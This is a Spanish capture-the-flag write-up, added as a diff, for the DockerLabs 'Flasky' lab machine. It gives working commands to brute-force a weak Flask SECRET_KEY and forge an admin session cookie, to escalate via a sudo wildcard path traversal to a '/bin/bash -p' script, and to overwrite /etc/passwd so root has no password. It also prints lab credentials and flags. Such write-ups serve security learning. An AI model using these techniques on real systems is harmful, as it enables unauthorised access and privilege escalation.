@@ -1,0 +1,211 @@
+# Write-up: Flasky (DockerLabs)
+
+**Plataforma:** DockerLabs  
+**Dificultad:** Media  
+**Técnicas:** Cookie Flask, Fuerza Bruta, Escalada de Privilegios (Path Traversal, Edición de `.bashrc`, Modificación de `/etc/passwd`)  
+**Objetivo:** Obtener la flag de usuario y la flag de root.
+
+---
+
+## Resumen
+
+En esta máquina, explotamos una cookie de sesión de Flask mal configurada. Mediante fuerza bruta obtenemos la `SECRET_KEY`,
+modificamos la cookie para convertirnos en administrador, accedemos por SSH como `peter`, escalamos a `pan` mediante path
+traversal en `sudo`, y finalmente llegamos a `root` editando el archivo `/etc/passwd`.
+
+---
+
+## Herramientas utilizadas
+
+- `nmap` - Escaneo de puertos.
+- `hacktrinks` - esta pagina ayudo a manipular la cookie
+- `sed`, `unset`, `unalias` - Limpieza de restricciones en `.bashrc`.
+
+---
+
+## Fase 1: Reconocimiento
+
+### Escaneo de puertos
+
+```bash
+nmap -p- -sS -sC -sV --min-rate=5000 -n -Pn 172.17.0.2
+
+Resultados:
+
+    22/tcp → SSH
+
+    5000/tcp → HTTP (Flask)
+
+Fase 2: Acceso como Administrador (Cookie Flask)
+2.1. Registro y login
+
+Accedemos a la web en http://172.17.0.2:5000.
+Creamos un usuario (ej. test:test) y nos logueamos.
+Obtenemos una cookie de sesión similar a:
+text
+
+.eJyrViooyk_LzElVslIqLU4tUtIBU_GZKUpWJhB2XmIuSDarNDFPqRYAkHwQMA.ai8RcA.7KhdYFeXwGqFOqHYrCn5R9p9bhU
+
+2.2. Decodificar la cookie
+bash
+
+flask-unsign --decode --cookie '.eJyrViooyk_LzElVslIqLU4tUtIBU_GZKUpWJhB2XmIuSDarNDFPqRYAkHwQMA.ai8RcA.7KhdYFeXwGqFOqHYrCn5R9p9bhU'
+
+Contenido:
+json
+
+{"profile": "user", "user_id": 4, "username": "juan"}
+
+2.3. Fuerza bruta de la SECRET_KEY
+bash
+
+flask-unsign --unsign --cookie '.eJyrViooyk_LzElVslIqLU4tUtIBU_GZKUpWJhB2XmIuSDarNDFPqRYAkHwQMA.ai8RcA.7KhdYFeXwGqFOqHYrCn5R9p9bhU' --wordlist /usr/share/wordlists/rockyou.txt
+
+Resultado:
+text
+
+[+] Secret key: secret123
+
+2.4. Firmar una nueva cookie como administrador
+bash
+
+flask-unsign --sign --cookie "{'profile':'admin','user_id':4,'username':'juan'}" --secret 'secret123'
+
+Cookie generada:
+text
+
+eyJwcm9maWxlIjoiYWRtaW4iLCJ1c2VyX2lkIjo0LCJ1c2VybmFtZSI6Imp1YW4ifQ.ajXxZw.7qusGsvdOwQ6v-feDmPsNKGXbFA
+
+2.5. Reemplazar la cookie en el navegador o en mi caso use burp
+
+Usuario: peter
+Contraseña: (la de el panel) e6okFUI4
+
+Fase 3: Acceso SSH como peter
+bash
+
+ssh peter@172.17.0.2
+
+3.1. Flag de usuario
+bash
+
+cat user.txt
+
+Flag:
+text
+
+DL_USER{Zk8N8v3+Sd50Q7m@P2x-Rb9@}
+
+3.2. Permisos sudo de peter
+bash
+
+sudo -l
+
+Salida:
+text
+
+User peter may run the following commands:
+    (pan) NOPASSWD: /usr/bin/bash /home/pan/*
+
+Observamos que peter puede ejecutar scripts en /home/pan/ como el usuario pan, pero el directorio está vacío 
+y no tenemos permisos de escritura.
+
+Fase 4: Escalada a pan
+4.1. Crear un script en /tmp/
+bash
+
+echo '#!/bin/bash' > /tmp/exploit.sh
+echo '/bin/bash -p' >> /tmp/exploit.sh
+chmod +x /tmp/exploit.sh
+
+4.2. Ejecutar con path traversal
+bash
+
+sudo -u pan /usr/bin/bash /home/pan/../../../../tmp/exploit.sh
+
+Resultado: Obtenemos una shell como pan.
+4.3. Verificar identidad
+bash
+
+whoami
+id
+
+Salida:
+text
+
+pan
+uid=1001(pan) gid=1001(pan)
+
+Fase 5: Escalada a root
+5.1. El problema: sudo no funciona
+bash
+
+sudo -l
+
+Error: sudo: command not found o similar (debido a restricciones en .bashrc).
+5.2. Limpiar el .bashrc
+
+El archivo /home/pan/.bashrc contiene funciones y alias que bloquean sudo.
+bash
+
+# Ver contenido problemático
+cat /home/pan/.bashrc
+
+# Borrar las líneas que definen funciones/alias de sudo
+sed -i '/sudo() {/,/alias sudo=/d' /home/pan/.bashrc
+
+# Limpiar el entorno actual
+unset -f sudo
+unalias sudo
+source /home/pan/.bashrc
+
+5.3. Verificar que sudo funciona
+bash
+
+sudo -l
+
+Salida esperada:
+text
+
+User pan may run the following commands:
+    (ALL) NOPASSWD: /usr/bin/mv
+
+5.4. Modificar /etc/passwd para tener root sin contraseña
+bash
+
+# Copiar el archivo original
+cat /etc/passwd > /tmp/passwd
+
+# Quitar la 'x' de la línea de root (eliminar contraseña)
+sed -i 's/^root:x:/root::/' /tmp/passwd
+
+# Mover el archivo modificado como root
+sudo /usr/bin/mv /tmp/passwd /etc/passwd
+
+# Cambiar a root
+su
+
+5.5. Flag de root
+bash
+
+cat /root/root.txt
+
+Flag:
+text
+
+DL_ROOT{fL3#zN8vT1%hWk9@G4s#Y2q&}
+
+Reflexión final
+
+    Cookie Flask: La SECRET_KEY era débil (secret123), permitiendo manipulación de la sesión.
+
+    Path Traversal en sudo: El comodín * permitió ejecutar scripts fuera de /home/pan/.
+
+    Restricciones en .bashrc: Se utilizaron funciones y alias para bloquear sudo, pero fueron fáciles de eliminar.
+
+    Escalada root: El permiso sudo mv permitió sobrescribir /etc/passwd y obtener acceso root sin contraseña.
+
+Archivos clave
+Archivo	Contenido
+/home/peter/user.txt	DL_USER{Zk8N8v3+Sd50Q7m@P2x-Rb9@}
+/root/root.txt	DL_ROOT{fL3#zN8vT1%hWk9@G4s#Y2q&}
